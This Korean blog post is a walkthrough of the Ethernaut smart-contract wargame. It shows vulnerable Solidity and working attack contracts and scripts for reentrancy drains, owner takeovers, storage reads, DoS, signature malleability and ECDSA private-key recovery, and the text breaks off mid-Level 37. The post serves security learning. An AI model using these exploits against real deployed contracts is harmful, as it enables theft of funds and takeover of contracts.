---
layout: post
title: "[Wargame] Ethernaut Level 0 ~ 40 완전 풀이"
date: 2026-04-28
category: 웹
author: yejunkim2000
tags: [Ethernaut, Wargame, Solidity, 스마트컨트랙트, 블록체인보안]
---

> **플랫폼:** [OpenZeppelin Ethernaut](https://ethernaut.openzeppelin.com/)

---

## 목차

- [Level 0 — Hello Ethernaut](#level-0--hello-ethernaut)
- [Level 1 — Fallback](#level-1--fallback)
- [Level 2 — Fallout](#level-2--fallout)
- [Level 3 — Coin Flip](#level-3--coin-flip)
- [Level 4 — Telephone](#level-4--telephone)
- [Level 5 — Token](#level-5--token)
- [Level 6 — Delegation](#level-6--delegation)
- [Level 7 — Force](#level-7--force)
- [Level 8 — Vault](#level-8--vault)
- [Level 9 — King](#level-9--king)
- [Level 10 — Re-entrancy](#level-10--re-entrancy)
- [Level 11 — Elevator](#level-11--elevator)
- [Level 12 — Privacy](#level-12--privacy)
- [Level 13 — Gatekeeper One](#level-13--gatekeeper-one)
- [Level 14 — Gatekeeper Two](#level-14--gatekeeper-two)
- [Level 15 — Naught Coin](#level-15--naught-coin)
- [Level 16 — Preservation](#level-16--preservation)
- [Level 17 — Recovery](#level-17--recovery)
- [Level 18 — Magic Number](#level-18--magic-number)
- [Level 19 — Alien Codex](#level-19--alien-codex)
- [Level 20 — Denial](#level-20--denial)
- [Level 21 — Shop](#level-21--shop)
- [Level 22 — Dex](#level-22--dex)
- [Level 23 — Dex Two](#level-23--dex-two)
- [Level 24 — Puzzle Wallet](#level-24--puzzle-wallet)
- [Level 25 — Motorbike](#level-25--motorbike)
- [Level 26 — Double Entry Point](#level-26--double-entry-point)
- [Level 27 — Good Samaritan](#level-27--good-samaritan)
- [Level 28 — Gatekeeper Three](#level-28--gatekeeper-three)
- [Level 29 — Switch](#level-29--switch)
- [Level 30 — Higher Order](#level-30--higher-order)
- [Level 31 — Stake](#level-31--stake)
- [Level 32 — Impersonator](#level-32--impersonator)
- [Level 33 — ImpersonatorTwo](#level-33--impersonatortwo)
- [Level 34 — Forger](#level-34--forger)
- [Level 35 — MagicAnimalCarousel](#level-35--magicanimalcarousel)
- [Level 36 — UniqueNFT](#level-36--uniquenft)
- [Level 37 — EllipticToken](#level-37--elliptictoken)
- [Level 38 — BetHouse](#level-38--bethouse)
- [Level 39 — NotOptimisticPortal](#level-39--notoptimisticportal)
- [Level 40 — Cashback](#level-40--cashback)

---

## Level 0 — Hello Ethernaut

| 항목 | 내용 |
|------|------|
| **난이도** | * |
| **핵심 개념** | 기본 컨트랙트 상호작용 |
| **목표** | `authenticate` 함수에 올바른 비밀번호 입력 |

### 문제 설명

Ethernaut의 튜토리얼 레벨. 콘솔에서 컨트랙트 함수를 직접 호출하는 법을 배운다.

### 풀이 방법

브라우저 개발자 콘솔에서 비밀번호를 찾고 인증한다.

```javascript
// 비밀번호 확인
await contract.password()
// → "ethernaut"

// 인증
await contract.authenticate("ethernaut")
```

### 핵심 포인트
- `contract` 객체를 통해 ABI에 정의된 모든 함수 호출 가능
- `await`로 트랜잭션 완료 대기

---

## Level 1 — Fallback

| 항목 | 내용 |
|------|------|
| **난이도** | * |
| **핵심 개념** | `receive()` fallback 함수, owner 탈취 |
| **목표** | owner가 되어 잔액을 전부 drain |

### 문제 설명

컨트랙트의 `receive()` 함수가 잘못 설계되어 있어 ETH를 보내는 것만으로 owner를 탈취할 수 있다.

### 취약한 코드

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender; // contributions가 있으면 owner 변경!
}
```

### 풀이 방법

```javascript
// Step 1: 최소 기여금 전송 (contributions 조건 충족)
await contract.contribute({ value: 1 })

// Step 2: ETH 직접 전송 → receive() 트리거 → owner 탈취
await signer.sendTransaction({ to: contract.address, value: 1 })

// Step 3: owner 확인 후 drain
await contract.owner() // → 내 주소
await contract.withdraw()
```

### 핵심 포인트
- `receive()`는 calldata 없이 ETH를 받을 때 실행
- owner 변경 조건을 `contributions` 체크만으로 제한하는 것은 취약

---

## Level 2 — Fallout

| 항목 | 내용 |
|------|------|
| **난이도** | * |
| **핵심 개념** | 오타 생성자, Solidity 0.6 이전 생성자 |
| **목표** | owner가 되기 |

### 문제 설명

Solidity 0.6 이전에는 생성자 이름이 컨트랙트명과 동일해야 했다. 여기서는 `Fallout` 대신 `Fal1out`으로 오타가 생겨 일반 함수가 되었다.

### 취약한 코드

```solidity
contract Fallout {
    // 오타! Fal1out (숫자 1) → 생성자가 아닌 일반 함수
    function Fal1out() public payable {
        owner = msg.sender;
    }
}
```

### 풀이 방법

```javascript
await contract.Fal1out()
await contract.owner() // → 내 주소 확인
```

### 핵심 포인트
- Solidity 0.8+ 에서는 `constructor` 키워드 필수
- 코드 리뷰 시 비슷한 철자 주의 필요

---

## Level 3 — Coin Flip

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | 블록체인 난수, 온체인 예측 공격 |
| **목표** | 동전 던지기 10번 연속 맞추기 |

### 문제 설명

`blockhash`를 난수 소스로 사용하는 것은 취약하다. 같은 블록에서 결과를 미리 계산할 수 있다.

### 취약한 코드

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

### 공격 컨트랙트

```solidity
contract CoinFlipAttack {
    ICoinFlip public target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) { target = ICoinFlip(_target); }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = (blockValue / FACTOR) == 1;
        target.flip(guess);
    }
}
```

### 풀이 방법

```javascript
// 공격 컨트랙트 배포 후 10번 호출 (블록당 1번)
for (let i = 0; i < 10; i++) {
    await attackContract.attack()
    // 새 블록 대기 후 다음 호출
}
```

### 핵심 포인트
- `blockhash`, `block.timestamp`는 예측 가능한 난수 소스
- 안전한 난수는 Chainlink VRF 같은 오프체인 오라클 사용

---

## Level 4 — Telephone

| 항목 | 내용 |
|------|------|
| **난이도** | * |
| **핵심 개념** | `tx.origin` vs `msg.sender` |
| **목표** | owner 변경 |

### 문제 설명

`tx.origin`은 트랜잭션을 시작한 EOA, `msg.sender`는 직접 호출자. 중간 컨트랙트를 거치면 둘이 달라진다.

### 취약한 코드

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

### 공격 컨트랙트

```solidity
contract TelephoneAttack {
    function attack(address target, address newOwner) external {
        ITelephone(target).changeOwner(newOwner);
    }
}
```

### 풀이 방법

```javascript
await attackContract.attack(contract.address, player)
```

### 핵심 포인트
- `tx.origin`을 인증에 사용하면 피싱 공격에 취약
- 항상 `msg.sender` 사용 권장

---

## Level 5 — Token

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | 정수 언더플로우 (Solidity < 0.8) |
| **목표** | 토큰 잔액 폭증 |

### 문제 설명

Solidity 0.8 미만에서는 정수 오버플로우/언더플로우가 자동으로 wrap around 된다.

### 취약한 코드

```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // uint은 항상 >= 0!
    balances[msg.sender] -= _value; // underflow!
    balances[_to] += _value;
}
```

### 풀이 방법

```javascript
// 초기 잔액 20개보다 1 많은 21 전송 → underflow → 2^256-1 토큰
await contract.transfer("0x0000000000000000000000000000000000000001", 21)
await contract.balanceOf(player) // → 매우 큰 숫자
```

### 핵심 포인트
- Solidity 0.8+ 에서는 자동 체크로 revert
- 구버전에서는 SafeMath 라이브러리 사용 필수

---

## Level 6 — Delegation

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | `delegatecall`, fallback 함수 |
| **목표** | Delegation 컨트랙트의 owner 탈취 |

### 문제 설명

`Delegation`은 `Delegate`로 delegatecall을 포워딩하는 fallback을 가진다. `Delegate.pwn()`을 호출하면 `Delegation`의 스토리지에 있는 `owner`가 변경된다.

### 풀이 방법

```javascript
const data = ethers.utils.id("pwn()").slice(0, 10)
await signer.sendTransaction({ to: contract.address, data: data })
await contract.owner() // → 내 주소
```

### 핵심 포인트
- `delegatecall`은 호출된 코드를 호출자의 컨텍스트(스토리지, msg.sender)에서 실행
- fallback + delegatecall 조합은 스토리지 오염 위험

---

## Level 7 — Force

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | `selfdestruct`로 강제 ETH 전송 |
| **목표** | 컨트랙트 잔액 > 0 만들기 |

### 문제 설명

`receive()`나 `fallback()`이 없는 컨트랙트도 `selfdestruct`를 통해 강제로 ETH를 받을 수 있다.

### 공격 컨트랙트

```solidity
contract ForceAttack {
    constructor() payable {}
    function attack(address payable target) external {
        selfdestruct(target);
    }
}
```

### 풀이 방법

```javascript
await forceAttack.attack(contract.address, { value: 1 })
```

### 핵심 포인트
- 컨트랙트 잔액 == 0 조건은 selfdestruct로 우회 가능
- `selfdestruct`는 수신 측의 동의 없이 ETH 강제 전송

---

## Level 8 — Vault

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | 블록체인 스토리지 투명성, `private` 변수 |
| **목표** | `locked = false` 만들기 |

### 문제 설명

`private` 변수는 다른 컨트랙트에서 접근할 수 없지만, 블록체인 스토리지는 누구나 읽을 수 있다.

### 스토리지 레이아웃

```
slot 0: bool locked
slot 1: bytes32 password
```

### 풀이 방법

```javascript
const password = await provider.getStorageAt(contract.address, 1)
await contract.unlock(password)
await contract.locked() // → false
```

### 핵심 포인트
- 블록체인 스토리지는 완전히 공개
- 비밀 데이터는 온체인에 평문으로 저장하면 안 됨

---

## Level 9 — King

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | ETH 전송 실패 DoS, pull over push |
| **목표** | 영원히 왕좌 유지 |

### 문제 설명

ETH를 보내면 이전 king에게 돌려주고 새 king이 된다. ETH 수신을 거부하는 컨트랙트를 왕으로 만들면 이후 모든 교체가 실패한다.

### 공격 컨트랙트

```solidity
contract KingAttack {
    constructor(address payable target) payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success);
    }
    receive() external payable { revert("No ETH"); }
}
```

### 핵심 포인트
- ETH 전송 실패가 전체 로직을 막을 수 있음 (DoS)
- Pull Payment 패턴이 안전

---

## Level 10 — Re-entrancy

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 재진입 공격 (Reentrancy) |
| **목표** | 컨트랙트 ETH 전부 drain |

### 문제 설명

`withdraw()`가 잔액 업데이트 전에 ETH를 전송한다. 수신 컨트랙트의 `receive()`에서 다시 `withdraw()`를 호출해 반복 인출 가능.

### 취약한 코드

```solidity
function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}(""); // 전송 먼저
        if (result) {
            balances[msg.sender] -= _amount; // 잔액 차감 나중
        }
    }
}
```

### 공격 컨트랙트

```solidity
contract ReentranceAttack {
    IReentrance target;
    uint256 amount;

    constructor(address payable _target) payable {
        target = IReentrance(_target);
        amount = msg.value;
    }

    function attack() external {
        target.donate{value: amount}(address(this));
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance >= amount) {
            target.withdraw(amount); // 재진입!
        }
    }
}
```

### 핵심 포인트
- Checks-Effects-Interactions 패턴 준수
- OpenZeppelin `ReentrancyGuard` 사용 권장

---

## Level 11 — Elevator

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | 인터페이스 신뢰 취약점 |
| **목표** | `top = true` 만들기 |

### 공격 컨트랙트

```solidity
contract ElevatorAttack {
    bool private flip = true;

    function isLastFloor(uint) external returns (bool) {
        flip = !flip;
        return flip; // 첫 호출: false, 두 번째: true
    }

    function attack(address target) external {
        IElevator(target).goTo(1);
    }
}
```

---

## Level 12 — Privacy

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 스토리지 레이아웃, 타입 캐스팅 |
| **목표** | `locked = false` 만들기 |

### 스토리지 레이아웃

```
slot 5: bytes32 data[2]  ← 상위 16바이트가 key
```

### 풀이 방법

```javascript
const data2 = await provider.getStorageAt(contract.address, 5)
const key = data2.slice(0, 34) // 상위 16바이트
await contract.unlock(key)
```

---

## Level 13 — Gatekeeper One

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | gas 조정, bytes 마스킹, tx.origin |
| **목표** | 3개의 modifier 동시 통과 |

### 공격 컨트랙트

```solidity
contract GatekeeperOneAttack {
    function attack(address target) external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint i = 200; i < 8191; i++) {
            (bool success, ) = target.call{gas: 8191 * 3 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) break;
        }
    }
}
```

---

## Level 14 — Gatekeeper Two

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 생성자 내 `extcodesize`, XOR 역산 |
| **목표** | `enter()` 통과 |

### 공격 컨트랙트

```solidity
contract GatekeeperTwoAttack {
    constructor(address target) {
        // 생성자 내: extcodesize(this) == 0
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        );
        IGatekeeperTwo(target).enter(key);
    }
}
```

---

## Level 15 — Naught Coin

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | ERC20 `transferFrom`, approval 우회 |
| **목표** | 토큰 잔액을 0으로 만들기 |

### 풀이 방법

```javascript
const total = await contract.balanceOf(player)
await contract.approve(player, total)
await contract.transferFrom(player, "0x0000000000000000000000000000000000000001", total)
```

---

## Level 16 — Preservation

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | `delegatecall` 스토리지 충돌 |
| **목표** | owner 탈취 |

### 공격 컨트랙트

```solidity
contract PreservationAttack {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner;            // slot 2

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}
```

### 풀이 방법

```javascript
// Step 1: slot 0을 공격 컨트랙트 주소로 교체
await contract.setFirstTime(BigInt(attackContractAddress))
// Step 2: owner 변경
await contract.setFirstTime(BigInt(player))
```

---

## Level 17 — Recovery

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | 컨트랙트 주소 파생 공식 |
| **목표** | 분실된 컨트랙트 찾아서 ETH 회수 |

### 풀이 방법

```javascript
const lostAddress = ethers.utils.getContractAddress({
    from: contract.address,
    nonce: 1
})
const simpleToken = new ethers.Contract(lostAddress, SIMPLE_TOKEN_ABI, signer)
await simpleToken.destroy(player)
```

---

## Level 18 — Magic Number

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | EVM 바이트코드 직접 작성 |
| **목표** | 42를 반환하는 최대 10 opcode짜리 컨트랙트 |

### 바이트코드 설계

```
런타임 코드 (10바이트):
  602a  PUSH1 42
  6000  PUSH1 0x00
  52    MSTORE
  6020  PUSH1 0x20
  6000  PUSH1 0x00
  f3    RETURN
```

### 풀이 방법

```javascript
const bytecode = "0x600a600c6000396000f3602a60005260206000f3"
const tx = await signer.sendTransaction({ data: bytecode })
await contract.setSolver(tx.contractAddress)
```

---

## Level 19 — Alien Codex

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | 동적 배열 언더플로우, 전체 스토리지 접근 |
| **목표** | owner 탈취 |

### 풀이 방법

```javascript
await contract.makeContact()
await contract.retract() // 배열 길이 underflow → 2^256-1

const baseSlot = BigInt(ethers.utils.solidityKeccak256(['uint256'], [1]))
const slot0Index = 2n ** 256n - baseSlot

const paddedPlayer = player.replace("0x", "0x000000000000000000000000")
await contract.revise(slot0Index, paddedPlayer)
```

---

## Level 20 — Denial

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 가스 고갈 DoS |
| **목표** | `withdraw()` 영구 차단 |

### 공격 컨트랙트

```solidity
contract DenialAttack {
    receive() external payable {
        uint i;
        while(true) { i++; } // 가스 전부 소비
    }
}
```

```javascript
await contract.setWithdrawPartner(attackContract.address)
```

---

## Level 21 — Shop

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | `view` 함수의 상태 의존 |
| **목표** | 가격을 100 미만으로 구입 |

### 공격 컨트랙트

```solidity
contract ShopAttack {
    IShop target;
    function price() external view returns (uint) {
        return target.isSold() ? 0 : 100;
    }
    function attack(address _target) external {
        target = IShop(_target);
        IShop(_target).buy();
    }
}
```

---

## Level 22 — Dex

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | AMM 가격 조작 |
| **목표** | DEX 토큰 한 종류 완전 drain |

### 풀이 방법

```javascript
await contract.approve(contract.address, ethers.constants.MaxUint256)
let [t1, t2] = [await contract.token1(), await contract.token2()]
for (let i = 0; i < 5; i++) {
    const bal = await contract.balanceOf(t1, player)
    await contract.swap(t1, t2, bal)
    ;[t1, t2] = [t2, t1]
}
```

---

## Level 23 — Dex Two

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 토큰 주소 검증 부재 |
| **목표** | 두 종류 토큰 모두 drain |

### 풀이 방법

```javascript
// FakeToken 배포 → DEX에 전송 → swap으로 실제 토큰 탈취
// token1, token2 각각 처리
```

---

## Level 24 — Puzzle Wallet

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | Proxy 스토리지 충돌, multicall 잔액 조작 |
| **목표** | proxy admin 탈취 |

### 풀이 방법

```javascript
await proxy.proposeNewAdmin(player)         // wallet.owner = player
await wallet.addToWhitelist(player)

const depositData = wallet.interface.encodeFunctionData("deposit")
const innerMulticall = wallet.interface.encodeFunctionData("multicall", [[depositData]])

await wallet.multicall([depositData, innerMulticall], {
    value: ethers.utils.parseEther("0.001")
})
await wallet.execute(player, ethers.utils.parseEther("0.002"), "0x")
await wallet.setMaxBalance(BigInt(player))  // proxy.admin = player
```

---

## Level 25 — Motorbike

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | UUPS 미초기화 구현체, selfdestruct |
| **목표** | 구현 컨트랙트 파괴 |

### 풀이 방법

```javascript
const EIP1967_IMPL_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
const implAddrRaw = await provider.getStorageAt(proxy.address, EIP1967_IMPL_SLOT)
const implAddr = "0x" + implAddrRaw.slice(26)

const engine = new ethers.Contract(implAddr, ENGINE_ABI, signer)
await engine.initialize()
await engine.upgradeToAndCall(
    bombContract.address,
    bomb.interface.encodeFunctionData("explode")
)
```

---

## Level 26 — Double Entry Point

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | Forta 봇, delegatecall 추적 |
| **목표** | DetectionBot 구현 |

### 풀이 방법

```solidity
contract DetectionBot is IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external override {
        (, , address origSender) = abi.decode(msgData[4:], (address, uint256, address));
        if (origSender == address(legacyToken)) {
            forta.raiseAlert(user);
        }
    }
}
```

---

## Level 27 — Good Samaritan

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 커스텀 에러 식별, 분기 유도 |
| **목표** | 지갑 잔액 전부 획득 |

### 공격 컨트랙트

```solidity
contract GoodSamaritanAttack {
    error NotEnoughBalance();

    function notify(uint256 amount) external pure {
        if (amount == 10) revert NotEnoughBalance();
    }

    function attack(address target) external {
        IGoodSamaritan(target).requestDonation();
    }
}
```

---

## Level 28 — Gatekeeper Three

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | 다중 조건 우회, 블록 타임스탬프 |
| **목표** | entrant 등록 |

### 공격 컨트랙트

```solidity
contract GatekeeperThreeAttack {
    constructor() payable {}
    function attack(address target) external {
        IGatekeeperThree g = IGatekeeperThree(target);
        g.construct0r();
        g.getAllowance(block.timestamp);
        g.enter();
    }
    receive() external payable { revert(); }
}
```

---

## Level 29 — Switch

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | calldata 오프셋 조작 |
| **목표** | 스위치를 ON으로 만들기 |

### 풀이 방법

```javascript
const flipSig = contract.interface.getSighash("flipSwitch")
const onSig   = contract.interface.getSighash("turnSwitchOn")
const offSig  = contract.interface.getSighash("turnSwitchOff")

const data = ethers.utils.hexConcat([
    flipSig,
    ethers.utils.hexZeroPad("0x60", 32),
    ethers.utils.hexZeroPad("0x00", 32),
    offSig + "00000000000000000000000000000000000000000000000000000000",
    ethers.utils.hexZeroPad("0x04", 32),
    onSig  + "00000000000000000000000000000000000000000000000000000000",
])
await signer.sendTransaction({ to: contract.address, data })
```

---

## Level 30 — Higher Order

| 항목 | 내용 |
|------|------|
| **난이도** | ** |
| **핵심 개념** | calldata 타입 범위 초과 |
| **목표** | `commander` 되기 |

### 풀이 방법

```javascript
const data = "0x211c85ab" +
    "0000000000000000000000000000000000000000000000000000000000000100"
await signer.sendTransaction({ to: contract.address, data })
await contract.claimLeadership()
```

---

## Level 31 — Stake

| 항목 | 내용 |
|------|------|
| **난이도** | *** |
| **핵심 개념** | ETH/WETH 회계 불일치 |
| **목표** | 컨트랙트 ETH drain, 자신의 staked 잔액 유지 |

### 풀이 방법

```javascript
// 1. WETH approve → stakeWETH (잔액만 기록, ETH 이동 없음)
// 2. stakeETH (진짜 ETH 예치)
// 3. unstake (ETH 인출 → 컨트랙트 잔액 = 0)
// 4. totalStaked > balance 조건 달성
```

---

## Level 32 — Impersonator

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | ECDSA 서명 가변성 (s → n-s) |
| **목표** | controller 변경 |

### 풀이 방법

```javascript
const n = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141")
const origS = BigInt("0x<원본 서명의 s값>")
const newS = (n - origS).toString(16).padStart(64, '0')

await contract.changeController(28, "0x<r>", "0x" + newS, ethers.constants.AddressZero)
```

---

## Level 33 — ImpersonatorTwo

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | ECDSA k 재사용 → 개인키 복구 (PS3 취약점) |
| **목표** | 컨트랙트 잔액 drain |

### 문제 설명

팩토리가 배포 시 사용한 두 서명의 r값이 동일하다. 같은 k(nonce)를 재사용했다는 뜻으로, PS3 ECDSA 취약점처럼 개인키를 수학적으로 복구할 수 있다.

### 취약점 원리

```
s1 = k⁻¹(z1 + r·sk) mod n
s2 = k⁻¹(z2 + r·sk) mod n

r1 = r2 이면:
  k  = (z1 - z2) · (s1 - s2)⁻¹ mod n
  sk = (s1·k - z1) · r⁻¹ mod n
```

### 풀이 방법

**Step 1 — Python으로 개인키 복구**

```python
from sympy import mod_inverse
from ecdsa import SigningKey, SECP256k1

n = SECP256k1.order

r  = 0xe5648161e95dbf2bfc687b72b745269fa906031e2108118050aba59524a23c40
s1 = 0x70026fc30e4e02a15468de57155b080f405bd5b88af05412a9c3217e028537e3
s2 = 0x4c3ac03b268ae1d2aca1201e8a936adf578a8b95a49986d54de87cd0ccb68a79
z1 = 0x937fa99fb61f6cd81c00ddda80cc218c11c9a731d54ce8859cb2309c77b79bf3
z2 = 0x6a0d6cd0c2ca5d901d94d52e8d9484e4452a3668ae20d63088909611a7dccc51

k  = mod_inverse(s1 - s2, n) * (z1 - z2) % n
sk = mod_inverse(r, n) * (s1 * k - z1) % n

signing_key = SigningKey.from_string(sk.to_bytes(32, 'big'), curve=SECP256k1)

LOCK_DIGEST = bytes.fromhex("22e1cf10d1c8bed2463521c56b4047a50cff188a411bf5c94f820e244eb01d35")

for digest, label in [(ADMIN_DIGEST, "setAdmin"), (LOCK_DIGEST, "switchLock")]:
    sig = signing_key.sign_digest(digest, k=k)
    r_h, s_h = sig.hex()[:64], sig.hex()[64:]
    if int(s_h, 16) > n // 2:
        s_h = hex(n - int(s_h, 16))[2:]
    print(f"{label}: r={r_h} s={s_h} v=28")
```

**Step 2 — JS 콘솔**

```javascript
const PLAYER = await signer.getAddress()

const adminHash = await contract.hash_message(
    ethers.utils.solidityPack(['string','string','address'], ['admin','2', PLAYER])
)
console.log("ADMIN_DIGEST:", adminHash)

const setAdminSig   = ethers.utils.solidityPack(['bytes32','bytes32','uint8'], [R, S_admin, 28])
const switchLockSig = ethers.utils.solidityPack(['bytes32','bytes32','uint8'], [R, S_lock, 28])

await contract.setAdmin(setAdminSig, PLAYER)
await contract.switchLock(switchLockSig)
await contract.withdraw()
```

---

## Level 34 — Forger

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | ECDSA 서명 가변성으로 서명 재사용 |
| **목표** | totalSupply > 100 ether |

### 문제 설명

미리 서명된 100 ether 민팅 서명이 존재한다. `signatureUsed`가 서명 bytes의 keccak256으로 체크하므로, `(r, s, v=28)` → `(r, n-s, v=27)` 가변 서명은 다른 bytes로 인식되어 두 번 사용 가능하다.

### 풀이 방법

```javascript
const n = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141")

const originalSig = "0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809"
                  + "402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb"
                  + "1c"

const receiver = "0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e"
const amount   = ethers.utils.parseEther("100")
const salt     = "0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d"
const deadline = ethers.constants.MaxUint256

// Step 1: 원본 서명으로 100 ether 민팅
await contract.createNewTokensFromOwnerSignature(originalSig, receiver, amount, salt, deadline)

// Step 2: 가변 서명 생성 (n - s, v 반전)
const s    = BigInt("0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb")
const sNeg = (n - s).toString(16).padStart(64, '0')
const malleableSig = "0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809"
                   + sNeg + "1b"

// Step 3: 가변 서명으로 추가 100 ether 민팅
await contract.createNewTokensFromOwnerSignature(malleableSig, receiver, amount, salt, deadline)
// totalSupply = 200 ether > 100 ether ✓
```

---

## Level 35 — MagicAnimalCarousel

| 항목 | 내용 |
|------|------|
| **난이도** | **** |
| **핵심 개념** | XOR 저장 취약점, NEXT_ID 필드 오염 |
| **목표** | 검증자의 Goat 저장을 다른 값으로 만들기 |

### 문제 설명

`setAnimalAndSpin`은 동물 비트를 직접 저장하지 않고 XOR로 저장한다. `changeAnimal`의 12바이트 이름 하위 16비트가 NEXT_ID 필드를 오염시킨다. `\xff\xff` 접미사로 nextId를 65535로 조작하면 검증자 호출이 이미 기록된 crate를 XOR로 덮어쓰게 되어 Goat와 다른 값이 저장된다.

### 스토리지 레이아웃

```
bits 255~176 : 동물 이름 (80비트)
bits 175~160 : NEXT_ID   (16비트)  ← changeAnimal로 오염 가능
bits 159~  0 : 소유자    (160비트)
```

### 풀이 방법

```javascript
// Step 1: crate 1에 Echidna 기록
await contract.setAnimalAndSpin("Echidna")

// Step 2: raw calldata로 changeAnimal 호출
const iface = new ethers.utils.Interface(["function changeAnimal(string,uint256)"])
const rawData = ethers.utils.hexConcat([
    iface.getSighash("changeAnimal"),
    ethers.utils.hexZeroPad("0x40", 32),
    ethers.utils.hexZeroPad("0x01", 32),
    ethers.utils.hexZeroPad("0x0c", 32),
    "0x31323334353637383930ffff"
])
await signer.sendTransaction({ to: contract.address, data: rawData })

// Step 3: crate 65535에 Pidgeon 기록
await contract.setAnimalAndSpin("Pidgeon")
```

---

## Level 36 — UniqueNFT

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | ERC721 콜백 재진입 + EIP-7702 |
| **목표** | 플레이어 NFT 잔액 > 1 |

### 문제 설명

`_mintNFT`가 `_mint` **전에** `checkOnERC721Received` 콜백을 발생시킨다. `mintNFTEOA`에는 ReentrancyGuard가 없다. EIP-7702로 EOA에 코드를 붙이면 `tx.origin == msg.sender` 조건을 유지하면서 콜백을 수신해 재진입 가능하다.

### 취약한 실행 흐름

```
mintNFTEOA()
  → require(balanceOf == 0) ✓  (아직 0)
  → checkOnERC721Received(player)  ← _mint 전에 콜백 발생
      → player.onERC721Received()  (EIP-7702 코드 보유)
          → 재진입: mintNFTEOA()
              → require(balanceOf == 0) ✓  (여전히 0)
              → _mint(player, tokenId=1) → balanceOf = 1
  → _mint(player, tokenId=0) → balanceOf = 2 ✓
```

### 공격 컨트랙트

```solidity
contract UniqueNFTAttack {
    UniqueNFT public target;
    bool entered;

    constructor(address _target) { target = UniqueNFT(_target); }

    function onERC721Received(address, address, uint256, bytes calldata)
        external returns (bytes4)
    {
        if (!entered) {
            entered = true;
            target.mintNFTEOA();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

```javascript
const auth = await signer.signAuthorization({ contractAddress: attackAddr })
await provider.send("eth_sendTransaction", [{
    from: player, authorizationList: [auth],
    to: player, data: "0x"
}])

await contract.mintNFTEOA()
// NFT 2개 보유 ✓
```

---

## Level 37 — EllipticToken

| 항목 | 내용 |
|------|------|
| **난이도** | ***** |
| **핵심 개념** | ECDSA 서명 위조 (퍼블릭키만으로) |
| **목표** | Alice 잔액을 0으로 만들기 |

### 문제 설명

`permit()`이 서명 검증에 `bytes32(amount)`를 메시지 해시로 직접 사용한다. Alice의 퍼블릭키를 복구한 뒤, ECDSA 방정식을 역으로 풀어 임의의 amount 값에 대해 Alice가 서명한 것처럼 위조할 수 있다.

### 서명 위조 원리

```
u1, u2 랜덤 선택
P = u1·G + u2·Alice_pubkey

r = P.x mod n
s = r · u2⁻¹ mod n
